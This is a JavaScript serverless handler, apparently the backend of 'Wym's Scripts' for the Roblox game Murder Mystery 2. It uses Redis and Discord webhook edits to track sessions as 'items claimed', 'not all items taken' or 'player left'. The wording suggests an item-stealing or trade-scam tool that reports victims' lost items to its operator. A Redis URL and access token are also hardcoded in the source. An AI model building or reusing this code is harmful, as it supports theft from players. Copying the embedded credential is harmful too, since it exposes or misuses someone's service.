import { Redis } from '@upstash/redis'

const redis = new Redis({
  url: "https://sincere-pika-37791.upstash.io",
  token: "AZOfAAIncDFhMGViOTE2MTRiYjg0ZjRmOWRmNTg4ODViNTNiNDAwMXAxMzc3OTE",
})

export default async function handler(req, res) {
    const { msgId, webhookUrl, action } = req.body;

    // 1. WATCHDOG: Check for dead sessions and mark as FAILED (Red)
    const keys = await redis.keys('hb_*');
    for (const key of keys) {
        const data = await redis.get(key);
        if (data && (Date.now() - data.lastSeen > 65000)) {
            await fetch(`${data.webhookUrl}/messages/${data.msgId}`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "Wym's Scripts • Murder Mystery 2",
                        description: "## Status:\n```lua\n🔴 Left (Player Left Or Crashed)```",
                        color: 16711680, // Red
                        footer: { text: "Status updated via Heartbeat" }
                    }]
                })
            }).catch(() => {});
            await redis.del(key);
        }
    }

    // 2. LIVE UPDATES: Handle Partial and Success while player is active
    if (msgId && webhookUrl) {
        let embedUpdate = null;

        if (action === "partial") {
            // Update to Yellow status
            embedUpdate = {
                title: "Wym's Scripts • Murder Mystery 2",
                description: "## Status:\n```lua\n🟡 Partial (Not All items taken)```",
                color: 16776960, // Yellow
                footer: { text: "Partial" }
            };
        } else if (action === "stop") {
            // Update to Green status
            embedUpdate = {
                title: "Wym's Scripts • Murder Mystery 2",
                description: "## Status:\n```lua\n🟢 Success (All items Claimed)```",
                color: 65280, // Green
                footer: { text: "Trade completed successfully!" }
            };
            // Remove from Redis so the Watchdog doesn't overwrite it with "Failed"
            await redis.del(`hb_${msgId}`);
        }

        // Send the PATCH request if we have an update
        if (embedUpdate) {
            await fetch(`${webhookUrl}/messages/${msgId}`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embedUpdate] })
            }).catch(() => {});
        }
    }

    // 3. HEARTBEAT: Keep the session alive (Ping)
    if (action === "ping" && msgId) {
        await redis.set(`hb_${msgId}`, { msgId, webhookUrl, lastSeen: Date.now() }, { ex: 3600 });
    } 

    return res.status(200).json({ ok: true });
}
